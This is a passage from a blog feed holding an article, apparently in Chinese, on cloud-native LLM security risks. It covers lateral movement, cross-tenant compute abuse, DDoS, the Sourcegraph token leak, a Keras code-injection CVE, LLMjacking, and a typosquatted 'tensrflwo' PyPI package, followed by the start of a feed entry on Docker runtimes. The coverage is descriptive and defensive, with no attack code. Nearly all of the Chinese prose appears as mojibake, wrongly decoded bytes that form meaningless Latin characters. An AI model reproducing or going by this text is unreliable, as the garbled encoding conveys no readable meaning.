LLM åœ¨å¤„ç†å¤§é‡æ•°æ®æ—¶å¯èƒ½é¢ä¸´çš„å®‰å…¨å¨èƒå’Œé£é™©ã€‚è¿™åŒ…æ‹¬æ¨ªå‘æ”»å‡»ã€è·¨ç§Ÿæˆ·ç®—åŠ›è°ƒåº¦å’Œ DDoS ç­‰æ–¹é¢å¨èƒã€‚</p><h4 id="3-2-1-æ¨ªå‘æ”»å‡»"><a href="#3-2-1-æ¨ªå‘æ”»å‡»" class="headerlink" title="3.2.1 æ¨ªå‘æ”»å‡»"></a>3.2.1 æ¨ªå‘æ”»å‡»</h4><p>æ¨ªå‘æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…åœ¨çªç ´äº† LLM ç³»ç»Ÿçš„æŸä¸ªç‚¹ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡åˆ©ç”¨æ¼æ´æˆ–æ³„éœ²çš„å‡­æ®ï¼‰ä¹‹åï¼Œå¼€å§‹åœ¨äº‘åŸºç¡€è®¾æ–½å†…éƒ¨æ¨ªå‘ç§»åŠ¨ï¼Œä»¥è®¿é—®æ›´å¤šçš„èµ„æºã€æ•°æ®æˆ–æœåŠ¡ã€‚</p><p>ç”±äºäº‘åŸç”Ÿæ¶æ„é€šå¸¸æ¶‰åŠå¤šä¸ªå¾®æœåŠ¡å’Œå®¹å™¨ï¼Œè¿™äº›æœåŠ¡ä¹‹é—´å¯èƒ½æœ‰å¹¿æ³›çš„ç½‘ç»œè¿æ¥ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›è¿æ¥æ¥æ‰©å±•å…¶æ”»å‡»èŒƒå›´ã€‚</p><p>åœ¨ LLM çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæ¨ªå‘æ”»å‡»å¯èƒ½å¯¼è‡´æ”»å‡»è€…è®¿é—®æ•æ„Ÿçš„æ¨¡å‹æ•°æ®ã€çªƒå–è®­ç»ƒæ•°æ®ã€æˆ–è€…ç”šè‡³ç¯¡æ”¹æ¨¡å‹è¡Œä¸ºï¼Œä»è€Œå¯¹æ•´ä¸ª AI æœåŠ¡çš„å¯ä¿¡åº¦å’Œå®‰å…¨æ€§é€ æˆå¨èƒã€‚</p><h4 id="3-2-2-è·¨ç§Ÿæˆ·ç®—åŠ›è°ƒåº¦"><a href="#3-2-2-è·¨ç§Ÿæˆ·ç®—åŠ›è°ƒåº¦" class="headerlink" title="3.2.2 è·¨ç§Ÿæˆ·ç®—åŠ›è°ƒåº¦"></a>3.2.2 è·¨ç§Ÿæˆ·ç®—åŠ›è°ƒåº¦</h4><p>è·¨ç§Ÿæˆ·ç®—åŠ›è°ƒåº¦æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡åˆ©ç”¨äº‘å¹³å°çš„å®‰å…¨æ¼æ´æˆ–é…ç½®é”™è¯¯ï¼Œèƒ½å¤Ÿåœ¨ä¸åŒç§Ÿæˆ·ä¹‹é—´éæ³•è°ƒåº¦æˆ–è®¿é—®è®¡ç®—èµ„æºã€‚</p><p>åœ¨ LLM çš„åº”ç”¨åœºæ™¯ä¸­ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿè®¿é—®å…¶ä»–ç§Ÿæˆ·çš„æ¨¡å‹å®ä¾‹æˆ–è®¡ç®—èµ„æºï¼Œä»è€Œè¿›è¡Œæœªæˆæƒçš„æ“ä½œï¼Œå¦‚çªƒå–æ¨¡å‹å‚æ•°ã€æ‰§è¡Œæ¶æ„è®­ç»ƒä»»åŠ¡æˆ–è¿›è¡Œèµ„æºè€—å°½æ”»å‡»ã€‚</p><p>è¿™ç§é£é™©å¼ºè°ƒäº†åœ¨äº‘ç¯å¢ƒä¸­å®æ–½ä¸¥æ ¼çš„å®‰å…¨éš”ç¦»å’Œèµ„æºç®¡ç†ç­–ç•¥çš„é‡è¦æ€§ï¼Œä»¥é˜²æ­¢ç§Ÿæˆ·ä¹‹é—´çš„ä¸å½“è®¿é—®å’Œèµ„æºæ»¥ç”¨ã€‚</p><h4 id="3-2-3-DDoS-æ”»å‡»"><a href="#3-2-3-DDoS-æ”»å‡»" class="headerlink" title="3.2.3 DDoS æ”»å‡»"></a>3.2.3 DDoS æ”»å‡»</h4><p>DDoS æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æ§åˆ¶å¤§é‡çš„åƒµå°¸ç½‘ç»œæˆ–åˆ©ç”¨äº‘æœåŠ¡çš„å¯æ‰©å±•æ€§ï¼Œå‘ç›®æ ‡ LLM æœåŠ¡å‘é€å¤§é‡ä¼ªé€ çš„è¯·æ±‚ï¼Œç›®çš„æ˜¯è€—å°½æœåŠ¡å™¨çš„å¸¦å®½ã€è®¡ç®—èµ„æºæˆ– API è¯·æ±‚é…é¢ï¼Œä»è€Œä½¿å¾—åˆæ³•ç”¨æˆ·æ— æ³•è®¿é—®æœåŠ¡ã€‚</p><p>å¯¹äº LLM æ¥è¯´ï¼ŒDDoS æ”»å‡»å¯èƒ½å¯¼è‡´æ¨¡å‹æœåŠ¡ä¸å¯ç”¨ï¼Œå½±å“ç”¨æˆ·ä½“éªŒï¼Œç”šè‡³å¯èƒ½å¯¼è‡´ä¸šåŠ¡ä¸­æ–­ã€‚åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­ï¼Œç”±äºäº‘æœåŠ¡é€šå¸¸æ˜¯é«˜åº¦åŠ¨æ€å’Œåˆ†å¸ƒå¼çš„ï¼Œé˜²å¾¡ DDoS æ”»å‡»å˜å¾—æ›´åŠ å¤æ‚ï¼Œè¿™éœ€è¦é‡‡ç”¨å¤šå±‚æ¬¡çš„å®‰å…¨ç­–ç•¥å’Œè‡ªåŠ¨åŒ–çš„æµé‡ç®¡ç†æªæ–½æ¥å‡è½»å…¶å½±å“ã€‚æ ¹æ® OWASP çš„æè¿°ï¼ŒDDoS å¯¹ LLM åº”ç”¨é€ æˆäº†é‡å¤§çš„å¨èƒï¼Œå› æ­¤ä»»ä½• LLM åº”ç”¨åœ¨å¼€å‘è¿‡ç¨‹ä¸­éƒ½å¿…é¡»è§£å†³è¿™ä¸€å¨èƒã€‚</p><p><img src="/image/image_vpnamQiLac.png" alt="å›¾ 14ï¼šDDoS çš„åŸç†" title="å›¾14ï¼šDDoSçš„åŸç†"></p><p>å°½ç®¡æ‹’ç»æœåŠ¡æ”»å‡»é€šå¸¸æ—¨åœ¨è¶…è½½ç³»ç»Ÿèµ„æºï¼Œä½†å®ƒä»¬ä¹Ÿå¯èƒ½åˆ©ç”¨ç³»ç»Ÿè¡Œä¸ºçš„å…¶ä»–æ–¹é¢ï¼Œä¾‹å¦‚ API é™åˆ¶ã€‚2023 å¹´ 8 æœˆ 31 æ—¥ï¼Œ<a href="https://sourcegraph.com/blog/security-update-august-2023" title="Sourcegraphç»å†äº†ä¸€æ¬¡å®‰å…¨äº‹ä»¶">Sourcegraph ç»å†äº†ä¸€æ¬¡å®‰å…¨äº‹ä»¶</a>ï¼Œæ”»å‡»è€…ä½¿ç”¨æ³„éœ²çš„ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œæ¥æ›´æ”¹ API é€Ÿç‡é™åˆ¶ï¼Œä»è€Œå¯èƒ½å¼•å‘æœåŠ¡ä¸­æ–­ã€‚</p><p><a href="https://sourcegraph.com/" title="sourcegraph">sourcegraph</a>é€šè¿‡å…¶äººå·¥æ™ºèƒ½ç¼–ç åŠ©æ‰‹ Codyï¼Œä¸ºå¼€å‘äººå‘˜æä¾›äº†ç›´æ¥åœ¨ç¼–è¾‘å™¨ä¸­å¿«é€Ÿæœç´¢ã€ç¼–å†™å’Œç†è§£ä»£ç çš„èƒ½åŠ›ã€‚ç„¶è€Œï¼Œè¿™ä¸€äº‹ä»¶å‡¸æ˜¾äº†åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸‹ï¼Œå³ä½¿æ˜¯é«˜åº¦è‡ªåŠ¨åŒ–çš„æœåŠ¡ä¹Ÿé¢ä¸´ç€ä¸¥å³»çš„å®‰å…¨æŒ‘æˆ˜ã€‚2023 å¹´ 8 æœˆ 30 æ—¥ï¼Œsourcegraph çš„å®‰å…¨å›¢é˜Ÿå‘ç° API çš„ä½¿ç”¨é‡æ˜¾è‘—æå‡ï¼Œå¹¶å¼€å§‹è°ƒæŸ¥åŸå› ã€‚</p><p><img src="/image/image_dZ2JeiTKNC.png" alt="å›¾ 15ï¼šsourcegraph çš„å®‰å…¨å›¢é˜Ÿå‘ç° API çš„ä½¿ç”¨é‡æ˜¾è‘—æå‡" title="å›¾15ï¼šsourcegraph çš„å®‰å…¨å›¢é˜Ÿå‘ç° API çš„ä½¿ç”¨é‡æ˜¾è‘—æå‡"></p><p>ç»è¿‡è°ƒæŸ¥å‘ç°ï¼Œåœ¨ 7 æœˆ 14 æ—¥æäº¤çš„ä»£ç æ—¶ï¼Œç«™ç‚¹ç®¡ç†å‘˜çš„è®¿é—®ä»¤ç‰Œåœ¨æ‹‰å–è¯·æ±‚çš„è¿‡ç¨‹ä¸­æ„å¤–æ³„æ¼ï¼Œæ”»å‡»è€…åœ¨å…¶å…¬å…±çš„ Sourcegraph å®ä¾‹ä¸­ä½¿ç”¨äº†æ³„æ¼çš„ç®¡ç†å‘˜è®¿é—® tokenï¼Œå¹¶åˆ©ç”¨è¯¥æƒé™æé«˜äº†ç”¨æˆ·çš„ API é€Ÿç‡é™åˆ¶ã€‚</p><p>Sourcegraph æ‰¿è¯ºå…è´¹æä¾› API è®¿é—®ï¼Œå¸å¼•äº†å¤§é‡ç”¨æˆ·åˆ›å»ºè´¦æˆ·å¹¶å¼€å§‹ä½¿ç”¨ä»£ç†åº”ç”¨ç¨‹åºã€‚è¿™ä¸ªåº”ç”¨ç¨‹åºåŠå…¶ä½¿ç”¨è¯´æ˜åœ¨ç½‘ç»œä¸Šè¿…é€Ÿä¼ æ’­ï¼Œäº§ç”Ÿäº†è¿‘ 200 ä¸‡æ¬¡æµè§ˆã€‚éšç€ç”¨æˆ·æ•°é‡çš„æ¿€å¢ï¼Œè¶Šæ¥è¶Šå¤šçš„äººé€šè¿‡åˆ›å»ºå…è´¹çš„ Sourcegraph.com è´¦æˆ·å¹¶æ·»åŠ è®¿é—®ä»¤ç‰Œï¼Œéæ³•è®¿é—® Sourcegraph APIï¼Œå¯¼è‡´äº†å¼‚å¸¸é«˜çš„è¯·æ±‚é‡ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´æœåŠ¡ä¸­æ–­ã€‚è¿™ä¸€äº‹ä»¶ä¸ä»…æ­ç¤ºäº†äº‘åŸç”Ÿç¯å¢ƒä¸‹çš„å®‰å…¨é£é™©ï¼Œä¹Ÿå¼ºè°ƒäº†åœ¨å¼€æ”¾ç½‘ç»œä¸­ä¿æŠ¤ API çš„é‡è¦æ€§ã€‚</p><h3 id="3-3-AI-åº”ç”¨é£é™©"><a href="#3-3-AI-åº”ç”¨é£é™©" class="headerlink" title="3.3 AI åº”ç”¨é£é™©"></a>3.3 AI åº”ç”¨é£é™©</h3><p>AI åº”ç”¨é£é™©æ˜¯æŒ‡åœ¨äººå·¥æ™ºèƒ½ç³»ç»Ÿï¼Œç‰¹åˆ«æ˜¯ LLM ç­‰ AI åº”ç”¨ä¸­å­˜åœ¨çš„æ½œåœ¨å¨èƒå’Œé£é™©ã€‚è¿™äº›é£é™©åŒ…æ‹¬ä¼ ç»Ÿæ”»å‡»å’Œ LLM API æ»¥ç”¨ç­‰æ–¹é¢ã€‚</p><h4 id="3-3-1-ä¼ ç»Ÿæ”»å‡»"><a href="#3-3-1-ä¼ ç»Ÿæ”»å‡»" class="headerlink" title="3.3.1 ä¼ ç»Ÿæ”»å‡»"></a>3.3.1 ä¼ ç»Ÿæ”»å‡»</h4><p>ä¼ ç»Ÿæ”»å‡»æŒ‡çš„æ˜¯åœ¨ AI ç³»ç»Ÿä¸­åˆ©ç”¨å·²çŸ¥çš„æ”»å‡»æ‰‹æ®µï¼Œå¦‚æ³¨å…¥æ¶æ„ä»£ç ã€åˆ©ç”¨è½¯ä»¶æ¼æ´ç­‰ã€‚</p><p>2024 å¹´ 4 æœˆ 16 æ—¥ï¼ŒåŸºäº TensorFlow çš„ Keras æ¨¡å‹ä¸­çš„ä¸€ä¸ª<a href="https://kb.cert.org/vuls/id/253266" title="å®‰å…¨æ¼æ´">å®‰å…¨æ¼æ´</a>è¢«çº°æ¼ï¼Œå¹¶è¢«å‘½åä¸º<a href="http://web.nvd.nist.gov/vuln/detail/CVE-2024-3660" title="CVE-2024-3660">CVE-2024-3660</a>ã€‚è¯¥æ¼æ´å­˜åœ¨äº 2.13 ç‰ˆæœ¬ä¹‹å‰çš„ Lambda å±‚ä¸­ã€‚åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ„å»º Keras æ¨¡å‹æ—¶æ³¨å…¥ä»»æ„ä»£ç ã€‚å½“åŠ è½½å’Œä½¿ç”¨è¿™äº›ç¬¬ä¸‰æ–¹æ¨¡å‹æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä»»æ„ä¸å—ä¿¡ä»»çš„ä»£ç åœ¨æœºå™¨å­¦ä¹ åº”ç”¨ç¨‹åºç¯å¢ƒä¸­ä»¥ç‰¹æƒçº§åˆ«æ‰§è¡Œã€‚</p><p><img src="/image/image_zyv7v8V0zX.png" alt="å›¾ 16ï¼šCVE-2024-3660 æ¼æ´è¯¦æƒ…" title="å›¾16ï¼šCVE-2024-3660 æ¼æ´è¯¦æƒ…"></p><p>æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ­¤åŠŸèƒ½å¯¹çƒ­é—¨æ¨¡å‹è¿›è¡Œæœ¨é©¬ç—…æ¯’æ”»å‡»ï¼Œä¿å­˜å¹¶é‡æ–°åˆ†å‘ï¼Œä»è€Œæ±¡æŸ“ä¾èµ– AI&#x2F;ML åº”ç”¨ç¨‹åºçš„ä¾›åº”é“¾ã€‚</p><h4 id="3-3-2-LLM-API-æ»¥ç”¨"><a href="#3-3-2-LLM-API-æ»¥ç”¨" class="headerlink" title="3.3.2 LLM API æ»¥ç”¨"></a>3.3.2 LLM API æ»¥ç”¨</h4><p>LLM API æ»¥ç”¨æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨å¤§å‹è¯­è¨€æ¨¡å‹çš„ API æ¥å£è¿›è¡Œéæ³•æ“ä½œæˆ–è·å–æ•æ„Ÿä¿¡æ¯ã€‚åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­ï¼Œè¿™ç§é£é™©å°¤ä¸ºçªå‡ºã€‚</p><p>2024 å¹´ 5 æœˆ 6 æ—¥ï¼ŒSysdig å¨èƒç ”ç©¶å›¢é˜Ÿè§‚å¯Ÿåˆ°çš„<a href="https://sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack" title="LLMjackingæ”»å‡»">LLMjacking æ”»å‡»</a>ï¼Œå°±æ˜¯åˆ©ç”¨çªƒå–çš„äº‘å‡­è¯é’ˆå¯¹äº‘æ‰˜ç®¡çš„å¤§å‹è¯­è¨€æ¨¡å‹æœåŠ¡å‘åŠ¨çš„ã€‚è¿™äº›å‡­è¯æ˜¯ä»ä¸€ä¸ªå¸¸è§ç›®æ ‡è·å¾—çš„ï¼Œå³è¿è¡Œæ˜“å—æ”»å‡»çš„ Laravel ç‰ˆæœ¬ ( <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3129" title="CVE-2021-3129">CVE-2021-3129</a> ) çš„ç³»ç»Ÿã€‚</p><p><img src="/image/Asset-33-2048x645_cc2rNxu0Ze.png" alt="å›¾ 17ï¼šLLMjacking çš„æ”»å‡»åŸç†" title="å›¾17ï¼šLLMjacking çš„æ”»å‡»åŸç†"></p><p>åœ¨æœ¬æ¬¡æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡åœ¨äº‘ç¯å¢ƒä¸­ä½¿ç”¨çœ‹ä¼¼åˆæ³•çš„ InvokeModel API  è¯·æ±‚ï¼Œå·§å¦™åœ°æµ‹è¯•äº†è®¿é—®è¾¹ç•Œï¼Œè€Œä¸ä¼šç«‹å³è§¦å‘è­¦æŠ¥ã€‚å®ƒä¸ä»…è¯å®äº†å¯¹ LLM çš„è®¿é—®å­˜åœ¨ï¼Œè¿˜è¯å®äº†è¿™äº›æœåŠ¡å¤„äºæ´»åŠ¨çŠ¶æ€ã€‚</p><p>åœ¨è¿™æ¬¡æ”»å‡»äº‹ä»¶ä¸­ï¼ŒAnthropic çš„æœ¬åœ° Claude (v2&#x2F;v3) LLM æ¨¡å‹æˆä¸ºæ”»å‡»ç›®æ ‡ã€‚å¦‚æœæœªè¢«å‘ç°ï¼Œè¿™ç§ç±»å‹çš„æ”»å‡»å¯èƒ½å¯¼è‡´å—å®³è€…æ¯å¤©èŠ±è´¹è¶…è¿‡ 46,000 ç¾å…ƒçš„ LLM æ¶ˆè´¹æˆæœ¬ã€‚Sysdig ç ”ç©¶äººå‘˜å‘ç°ï¼ŒLLM åå‘ä»£ç†è¢«ç”¨äºæä¾›å¯¹å—æ„ŸæŸ“è´¦æˆ·çš„è®¿é—®æƒé™ï¼Œè¿™è¡¨æ˜å…¶å­˜åœ¨ç»æµåŠ¨æœºã€‚ç„¶è€Œï¼Œå¦ä¸€ä¸ªå¯èƒ½çš„åŠ¨æœºæ˜¯æå– LLM è®­ç»ƒæ•°æ®ã€‚</p><h3 id="3-4-å·¦ç§»é£é™©"><a href="#3-4-å·¦ç§»é£é™©" class="headerlink" title="3.4 å·¦ç§»é£é™©"></a>3.4 å·¦ç§»é£é™©</h3><p>åœ¨äº‘åŸç”Ÿåœºæ™¯ä¸‹ï¼Œå·¦ç§»ï¼ˆShift Leftï¼‰é£é™©æ˜¯æŒ‡åœ¨è½¯ä»¶å¼€å‘å’Œéƒ¨ç½²çš„æ—©æœŸé˜¶æ®µå°±å­˜åœ¨çš„å®‰å…¨é£é™©ã€‚å¯¹äº LLM æ¥è¯´ï¼Œå·¦ç§»é£é™©é€šå¸¸æ¶‰åŠåˆ°åœ¨æ¨¡å‹å¼€å‘ã€è®­ç»ƒã€æ‰“åŒ…å’Œéƒ¨ç½²è¿‡ç¨‹ä¸­å¯èƒ½å¼•å…¥çš„å®‰å…¨é£é™©ã€‚å¸¸è§çš„é£é™©æœ‰ï¼š</p><h4 id="3-4-1-AI-åº”ç”¨é•œåƒæ„å»ºæŠ•æ¯’"><a href="#3-4-1-AI-åº”ç”¨é•œåƒæ„å»ºæŠ•æ¯’" class="headerlink" title="3.4.1 AI åº”ç”¨é•œåƒæ„å»ºæŠ•æ¯’"></a>3.4.1 AI åº”ç”¨é•œåƒæ„å»ºæŠ•æ¯’</h4><p>åœ¨äº‘åŸç”Ÿåœºæ™¯ä¸‹ï¼ŒAI åº”ç”¨çš„é•œåƒæ„å»ºè¿‡ç¨‹æ˜¯ä¸€ä¸ªå…³é”®ç¯èŠ‚ã€‚æ‰€è°“çš„é•œåƒæ„å»ºæŠ•æ¯’ï¼ŒæŒ‡çš„æ˜¯åœ¨æ„å»º AI åº”ç”¨é•œåƒæ—¶ï¼Œæ¶æ„ä»£ç è¢«æ‚„æ‚„æ¤å…¥åˆ°é•œåƒä¸­ã€‚è¿™ç§é£é™©å¯èƒ½å¯¼è‡´è®­ç»ƒæ•°æ®å’Œæ¨¡å‹å‚æ•°è¢«çªƒå–ã€LLM çš„åŠŸèƒ½å—åˆ°ç ´åç”šè‡³å½±å“åˆ°åº”ç”¨çš„æ­£å¸¸è¿è¡Œã€‚</p><h4 id="3-4-2-åé—¨é£é™©"><a href="#3-4-2-åé—¨é£é™©" class="headerlink" title="3.4.2 åé—¨é£é™©"></a>3.4.2 åé—¨é£é™©</h4><p>åé—¨é£é™©æ˜¯æŒ‡åœ¨ AI åº”ç”¨é•œåƒæˆ–è½¯ä»¶åŒ…ä¸­æ¤å…¥éšè—çš„å…¥å£ç‚¹ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™äº›å…¥å£ç‚¹è¿œç¨‹æ§åˆ¶å—æ„ŸæŸ“çš„ç³»ç»Ÿã€‚åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­ï¼Œåé—¨é£é™©å°¤ä¸ºä¸¥é‡ã€‚äº‘ç¯å¢ƒä¸­çš„æœåŠ¡é€šå¸¸æ˜¯é«˜åº¦å¯æ‰©å±•çš„ï¼Œä¸€æ—¦åé—¨è¢«æ¤å…¥ï¼Œæ”»å‡»è€…å¯ä»¥è¿…é€Ÿæ‰©å¤§æ”»å‡»èŒƒå›´ã€‚ç”±äºäº‘åŸç”Ÿç¯å¢ƒçš„åŠ¨æ€æ€§å’Œå¤æ‚æ€§ï¼Œåé—¨å¯èƒ½é•¿æ—¶é—´ä¸è¢«å‘ç°ã€‚</p><h4 id="3-4-3-æ¶æ„è½¯ä»¶åŒ…"><a href="#3-4-3-æ¶æ„è½¯ä»¶åŒ…" class="headerlink" title="3.4.3 æ¶æ„è½¯ä»¶åŒ…"></a>3.4.3 æ¶æ„è½¯ä»¶åŒ…</h4><p>åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­ï¼Œå¼€å‘è€…å¸¸å¸¸ä¾èµ–ç¬¬ä¸‰æ–¹è½¯ä»¶åŒ…æ¥æ„å»ºåº”ç”¨ã€‚æ”»å‡»è€…å¯èƒ½ä¼šå‘å¸ƒä¸å¸¸ç”¨è½¯ä»¶åŒ…åç§°ç›¸ä¼¼çš„æ¶æ„è½¯ä»¶åŒ…ï¼Œè¯±å¯¼å¼€å‘è€…ä¸‹è½½ã€‚</p><p>2024 å¹´ 1 æœˆ 15 æ—¥ï¼Œæ‚¬é•œä¾›åº”é“¾å®‰å…¨å®éªŒå®¤åœ¨<a href="https://pypi.org/" title="Pypi">Pypi</a>å®˜æ–¹ä»“åº“ä¸­å‘ç°äº†ä¸€èµ·é’ˆå¯¹ AI å¼€å‘è€…çš„<a href="https://developer.aliyun.com/article/1424433" title="æ¶æ„è½¯ä»¶åŒ…æŠ•æ¯’äº‹ä»¶">æ¶æ„è½¯ä»¶åŒ…æŠ•æ¯’äº‹ä»¶</a>ï¼Œæ”»å‡»è€…é€šè¿‡åŒ…åé”™è¯¯æ‹¼å†™ (typo-squatting) çš„æ”»å‡»æ–¹å¼ä»¿å†’çŸ¥åæœºå™¨å­¦ä¹ æ¡†æ¶ tensorflow çš„åŒ…åæ¥å®æ–½æ”»å‡»ã€‚æŠ•æ¯’æ”»å‡»ç›®æ ‡é”å®š AI å¼€å‘è€…ï¼Œä¸€æ—¦æ¶æ„è½¯ä»¶åŒ…è¢«é›†æˆåˆ° AI åº”ç”¨ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡è¿™äº›è½¯ä»¶åŒ…å¯¹æ•´ä¸ªä¾›åº”é“¾å‘èµ·æ”»å‡»ã€‚</p><p><img src="/image/image_wAu9Cbbr9T.png" alt="å›¾ 18:tensorflow åŒ…" title="å›¾18:tensorflow åŒ…"></p><p>æˆªè‡³ç›®å‰ï¼ŒæŠ•æ¯’è€…åœ¨ Pypi ä»“åº“å…±å‘å¸ƒ 5 ä¸ªä¸åŒç‰ˆæœ¬çš„æ¶æ„åŒ…ã€‚python å¼€å‘è€…ä¸€æ—¦é€šè¿‡ pip å‘½ä»¤ä¸‹è½½æˆ–å®‰è£…è¯¥æŠ•æ¯’åŒ…ï¼ˆtensrflwoï¼‰ï¼Œåˆ™ä¼šè§¦å‘æ‰§è¡Œ Py ç»„ä»¶åŒ…ä¸­çš„æ¶æ„åé—¨ä»£ç ï¼Œå¹¶æœ€ç»ˆå¯¼è‡´å¼€å‘è€…ç³»ç»Ÿè¢«æ”»å‡»è€…è¿œç¨‹æ§åˆ¶ã€‚</p><p><img src="/image/image_SjteD2YGef.png" alt="å›¾ 19:tensrflwo åŒ…çš„ç›¸å…³ä¿¡æ¯" title="å›¾19:tensrflwo åŒ…çš„ç›¸å…³ä¿¡æ¯"></p><p>æ¶æ„ Py åŒ… tensrflwo åœ¨ Pypi å®˜æ–¹ä»“åº“ä¸Šçš„æ€»ä¸‹è½½é‡ä¸º 870 æ¬¡ã€‚</p><p><img src="/image/image_zJpJigCcL1.png" alt="å›¾ 20:tensrflwo åŒ…çš„ä¸‹è½½æ¬¡æ•°" title="å›¾20:tensrflwo åŒ…çš„ä¸‹è½½æ¬¡æ•°"></p><p>è¯¥æ¶æ„ Py åŒ…å·²ä» Pypi å®˜æ–¹ä»“åº“ä¸‹æ¶ï¼Œä½†é€šè¿‡å›½å†…ä¸»æµ Pypi é•œåƒæº (æ¸…åå¤§å­¦ã€è…¾è®¯äº‘ç­‰) ä¾æ—§å¯æ­£å¸¸ä¸‹è½½ã€å®‰è£…è¯¥æ¶æ„åŒ…ï¼Œå› æ­¤æ½œåœ¨çš„å—å®³è€…æ•°é‡å°†ä¼šæ›´å¤šï¼Œå°¤å…¶å¯¹äºå›½å†…å¹¿å¤§ä½¿ç”¨ tensorflow æ·±åº¦å­¦ä¹ æ¡†æ¶çš„ AI å¼€å‘è€…æ¥è¯´ï¼Œä»å­˜åœ¨è¢«æ¶æ„æŠ•æ¯’æ”»å‡»çš„é£é™©ã€‚</p><p><img src="/image/image_OAWnKFwWR8.png" alt="å›¾ 21:å›½å†… Pypi é•œåƒæºä»ç„¶å¯æ­£å¸¸ä¸‹è½½è¯¥æ¶æ„è½¯ä»¶åŒ…" title="å›¾21:å›½å†… Pypi é•œåƒæºä»ç„¶å¯æ­£å¸¸ä¸‹è½½è¯¥æ¶æ„è½¯ä»¶åŒ…"></p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>éšç€å¤§å‹è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰åœ¨å„ä¸ªé¢†åŸŸçš„åº”ç”¨æ—¥ç›Šå¢å¤šï¼Œå…¶å®‰å…¨æ€§ä¹Ÿæ—¥ç›Šæˆä¸ºå…³æ³¨çš„ç„¦ç‚¹ã€‚</p><p>æœ¬æ–‡ï¼Œæˆ‘ä»¬ç®€å•ä»‹ç»äº† OWASP æ‰€æä¾›çš„åå¤§ LLM å®‰å…¨é£é™©ã€‚å› ä¸ºäº‘åŸç”Ÿç¯å¢ƒçš„å¼€æ”¾æ€§ã€å¤æ‚æ€§å’Œèµ„æºå…±äº«ç‰¹æ€§ï¼Œè¿™äº›é£é™©åœ¨äº‘åŸç”Ÿåœºæ™¯ä¸‹å°¤ä¸ºçªå‡ºï¼Œä½¿å¾— LLM åœ¨å¤„ç†å¤§é‡æ•°æ®æ—¶å¯èƒ½é¢ä¸´çš„å®‰å…¨å¨èƒå’Œé£é™©æ›´åŠ å¤šæ ·åŒ–ã€‚</p><p>ä¸ºäº†æ›´å¥½åœ°ä¿éšœ LLM çš„å®‰å…¨æ€§ï¼Œæˆ‘ä»¬éœ€è¦ä»å„ä¸ªæ–¹é¢è¿›è¡Œç»¼åˆè€ƒè™‘ã€‚è¿™åŒ…æ‹¬ä½†ä¸é™äºåŠ å¼ºç®—åŠ›å¹³å°çš„å®‰å…¨é˜²æŠ¤ï¼Œæå‡ç®—åŠ›ç½‘ç»œçš„å®‰å…¨æ€§ï¼Œä»¥åŠåŠ å¼º AI åº”ç”¨çš„å®‰å…¨æªæ–½ã€‚åŒæ—¶ï¼Œä¹Ÿéœ€è¦åŠ å¼ºå¯¹ LLM å®‰å…¨æ€§çš„ç ”ç©¶å’Œäº†è§£ï¼Œæé«˜å¼€å‘è€…å’Œç”¨æˆ·çš„å®‰å…¨æ„è¯†ï¼Œä»¥åŠé‡‡å–æ›´åŠ ç§¯æä¸»åŠ¨çš„å®‰å…¨æªæ–½ï¼Œä»¥åº”å¯¹äº‘åŸç”Ÿåœºæ™¯ä¸‹ LLM é¢ä¸´çš„å„ç§é£é™©ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>äº‘åŸç”Ÿå®‰å…¨</tag>
      
      <tag>LLM å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å°çŒ«å’ªå¸¦ä½ ç†æ¸… Dockerã€containerdã€CRI-O å’Œ runc ä¹‹é—´çš„åŒºåˆ«</title>
    <link href="/2024/07/09/%E5%B0%8F%E7%8C%AB%E5%92%AA%E5%B8%A6%E4%BD%A0%E7%90%86%E6%B8%85Docker%E3%80%81containerd%E3%80%81CRI-O-%E5%92%8C-runc-%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2024/07/09/%E5%B0%8F%E7%8C%AB%E5%92%AA%E5%B8%A6%E4%BD%A0%E7%90%86%E6%B8%85Docker%E3%80%81containerd%E3%80%81CRI-O-%E5%92%8C-runc-%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
